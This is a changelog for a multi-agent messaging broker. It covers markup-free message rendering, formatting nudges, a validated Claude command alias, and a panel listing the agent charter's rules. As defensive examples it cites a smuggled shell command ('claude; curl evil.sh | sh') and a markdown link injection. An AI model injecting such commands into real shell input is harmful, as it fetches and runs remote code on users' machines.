# sys-buddy v2.7.0 — 2026-08-06

Minor release. **Three things a human hits before they ever see the product work.**
No schema change, no migration, no tool renamed or removed. Restart any long-running
broker to pick it up.

## Added

### Messages render with shape

The thread rendered every message body as one escaped blob, so a structured status
update from an agent arrived as a wall of text — the point at which a human stops
reading the thing the whole dashboard exists to show them.

`scopeHTML` had already solved this for a todo's `scope`, with a **markup-free** shape
parser. The parse is now shared (`proseBlocks`) and message bubbles render through
`bodyHTML`:

```
blank line                            ->  new paragraph
line starting `- `                    ->  bullet
SHORT line, ALL CAPS or ending ':'    ->  heading
```

**Still no markdown, and the reasoning is stronger here than for scopes.** A scope is
written by your own side's agent; a message is peer content from another company's
agent — the exact injection vector the charter exists for. A markdown renderer would
buy nicer bullets and hand back `[click here](evil.com)` and image loads inside a page
holding a viewer token. These three shapes carry no markup at all, which is precisely
why they are safe to render.

**A one-line message renders byte-identically to before** — no wrapper, no layout box.
Verified in the DOM rather than by eye: zero child elements. That is the common case
and it must not gain furniture because long messages now read better.

Agents are taught the three shapes in all three briefing modes and in both
`send_message` docstrings, and told plainly that it is **not** markdown. An agent told
only "format nicely" reaches for `**bold**` and gets literal asterisks on screen.

### The broker says when a message won't read well

`send_message`'s receipt gains a note when a body runs over **400 characters with no
line break at all**:

```
Delivered to task 'signin' (2 recipient(s)). id=41
NOTE: 487 characters with no line breaks — that renders as one unbroken block on your
human's dashboard. A blank line starts a new paragraph; a line starting `- ` becomes a
bullet.
```

**Deliberately not a refusal.** A badly-shaped message costs readability; a wrongly
refused one costs a turn, and can stall a collaboration. Worse, an agent that hits a
formatting gate will optimise for the gate — inserting a bullet to get past it, or
truncating to get under a limit. That trades "hard to read" for "information deleted
to satisfy a validator".

The check is a **rendering fact, not a style opinion**: no newline means one block,
which is what `proseBlocks` splits on and nothing else. No heuristics about bullet
density or sentence length. Proven live — a well-shaped **495-character** message gets
a clean receipt while a **487-character** wall is nudged.

### Your own Claude command

Anyone running more than one install — `claude-personal`, `claude-work` — was editing
every generated command by hand. `binary` now threads through the command builders, and
both the buddy's join page and the host's Host screen offer it. **Free text, not a
picker:** an alias cannot be enumerated.

Three things it gets right, each a way this goes quietly wrong:

* **The substitution is line-anchored.** A blind replace of `claude` would also rewrite
  an occurrence inside the bearer token, producing a command that looks perfect and
  authenticates as nobody.
* **Validated identically on the page and the server.** The rendered string is pasted
  into a shell, so `claude; curl evil.sh | sh` typed into an alias box would be a
  paste-ready attack we drew for the user ourselves. A test pins the two character sets
  together.
* **The "how to know it worked" line follows the alias too.** Telling someone their
  command is `claude-work` and then, one line down, to run `claude mcp list` is the same
  hand-edit — on the line they run when something is already wrong.

### "What we're asking", above the briefing prompt

A plain-language panel on the join page: what the agent **gains**, what **leaves** the
machine, what it is told **never** to do, and **who can see** the task.

**The "never" list is parsed from `RULES_OF_ENGAGEMENT`** — every rule, rendered as that
rule's own opening sentence rather than anyone's paraphrase. Edit a rule and the panel
moves; add one and it appears. A summary that drifts from the rules it summarises is not
a stale sentence, it is a **false assurance shown exactly where trust is being decided**
— so the panel reads the charter rather than describing it. Tests assert every line is
literally a substring of the charter, and that every credential-shaped column in the
schema still ends in `_hash`, because the panel promises the broker stores no
credentials.

The page was already receiving the full charter and discarding it. **"Read the full
charter" now expands it inline** instead of being a link to nowhere.

Above the prompt, not beside it: beside puts the reassurance in peripheral vision while
the eye goes to the scrolling box and then to the Copy button. Above is what you pass
through on the way to copying — and it needs no second layout for a phone.

## Fixed

### The Playwright setup doc could pass its own verification while broken

`claude mcp add --scope user` does not resolve to a fixed path. It writes to
`$CLAUDE_CONFIG_DIR/.claude.json`, falling back to `~/.claude.json`. On a machine where
that variable is set for Claude sessions but **not** for a plain terminal, those are two
different files — the add succeeds, and lands in the one the session never reads.

The old verify step made this invisible: *"Verify with `claude mcp list`"*, run in the
same terminal as the add, reads the file the add just wrote. **It agrees with itself
whether or not your session can see the server** — a self-consistent no-op that then
discredits the (correct) "restart your session" advice when the tools still aren't
there.

The doc now leads with `.mcp.json` (read relative to the working directory, so
`CLAUDE_CONFIG_DIR` cannot misdirect it), verifies **from inside the session**, names the
failure with the `echo $CLAUDE_CONFIG_DIR` comparison, and mentions the first-load
approval prompt so that isn't read as another failure.

Diagnosed on a real machine where exactly this happened.

## Migration

* **None.** No schema change, no new table, no tool renamed or removed, no payload key
  removed. One new field on the `/pair` response (`asking`); a page from an older broker
  that doesn't send it hides the panel rather than showing an empty one.
* **Restart any long-running broker.** A process started before this release keeps
  serving its old `ui.html` and `join.html`, and keeps briefing agents from its old copy.
* **Re-brief your agents** to pick up the message-shape conventions.

## Tests

**1519 passing**, up from 1476.

The load-bearing ones are the ones that fail *loudly* rather than let something drift:
a well-shaped message getting a receipt asserted by **equality** (not merely "no NOTE"),
the page and server alias validators pinned to the same character set, every connect
line asserted to start with the binary (which the page's substitution depends on), and
every "never" line asserted to be the charter's own text.

Both pages driven in a real browser: the panel with all seven rules and the full
charter inline, the alias substituting live with the bearer token untouched, and a
hostile alias refused on both sides.
